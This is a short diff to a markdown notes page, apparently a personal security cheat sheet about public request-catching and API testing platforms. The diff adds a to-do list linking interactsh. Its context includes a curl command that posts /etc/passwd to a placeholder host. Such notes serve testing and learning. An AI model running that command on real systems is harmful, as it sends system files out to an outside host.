@@ -29,3 +29,15 @@ We may use online public solutions such as API Testing Platforms:
 $ curl http://XXX/xxxxxx -F "data=@/etc/passwd"
 ```
 </div></div>
+
+<hr class="sep-both">
+
+## 👻 To-do 👻
+
+Stuff that I found, but never read/used yet.
+
+<div class="row row-cols-lg-2"><div>
+
+* [interactsh](https://app.interactsh.com/#/)
+</div><div>
+</div></div>
